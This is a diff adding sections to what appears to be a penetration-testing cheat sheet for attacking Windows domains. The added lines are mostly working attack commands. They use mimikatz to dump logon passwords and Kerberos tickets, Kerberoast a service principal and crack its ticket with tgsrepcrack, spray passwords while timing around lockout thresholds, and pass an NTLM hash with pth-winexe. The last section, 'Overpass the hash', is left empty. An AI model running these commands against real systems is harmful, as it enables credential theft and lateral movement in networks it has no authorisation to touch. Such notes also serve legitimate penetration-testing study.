@@ -86,3 +86,40 @@ follow on (from target host):
 nslookup website.domain.name
 ```
 
+### TBD
+
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords   # NTLM, SHA1 are needed for pre Windows 2003
+sekurlsa::tickets
+```
+
+### TBD
+
+```
+(PS) Add-Type -AssemblyName System.IdentityModel
+(PS) New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN name>' # create SPN ticket
+(PS) klist
+```
+```
+mimikatz.exe
+kerberos::list /export # download SPN ticket
+```
+(transfer .kerbi file to kali for use with kerberoast apt package)
+```
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <path_to_kirbi_file>
+```
+
+### Low & Slow Password Guessing
+
+* `net accounts # see lockout threshold + lockout observation window (which gives one free login attempt)`
+* `(PS) .\Spray-Passwords.ps1 -Pass <password> -Admin` (see https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
+
+### Pass The Hash
+
+* `pth-winexe -U <NTLM_hash> //hostip <cmd>` (see https://github.com/byt3bl33d3r/pth-toolkit)
+
+### Overpass the hash
+
+* 
